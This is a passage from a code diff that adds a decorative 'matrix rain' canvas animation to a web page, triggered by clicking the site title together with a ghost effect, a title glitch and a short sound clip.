+        document.body.appendChild(canvas);
+        const ctx = canvas.getContext('2d');
+
+        // Set canvas size
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        // Matrix characters
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$+-*/=%"\'#&_(),.;:?!\\|{}<>[]^~';
+        const charArray = chars.split('');
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+
+        // Initialize drops
+        for (let i = 0; i < columns; i++) {
+            drops[i] = 1;
+        }
+
+        // Draw matrix rain
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = '#0F0';
+            ctx.font = fontSize + 'px monospace';
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = charArray[Math.floor(Math.random() * charArray.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+
+        // Add ghost animation functionality
+        const siteTitle = document.querySelector('.site-title');
+
+        siteTitle.addEventListener('click', (e) => {
+            e.preventDefault();
+            
+            // Activate matrix effect
+            canvas.classList.add('active');
+            
+            // Create ghost element
+            const ghost = document.createElement('div');
+            ghost.className = 'ghost-animation';
+            document.body.appendChild(ghost);
+
+            // Add glitch effect to title
+            siteTitle.classList.add('glitch-text');
+            
+            // Play spooky sound
+            const audio = new Audio('https://assets.mixkit.co/active_storage/sfx/2003/2003-preview.mp3');
+            audio.volume = 0.3;
+            audio.play().catch(() => {
+                console.log('Audio autoplay prevented');
+            });
+
+            // Start matrix animation
+            let matrixInterval = setInterval(drawMatrix, 50);
+
+            // Remove ghost and stop matrix after animation
+            setTimeout(() => {
+                ghost.remove();
+                siteTitle.classList.remove('glitch-text');
+                canvas.classList.remove('active');
+                clearInterval(matrixInterval);
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+            }, 2000);
+        });
+    </script>
+</body>
+</html> 
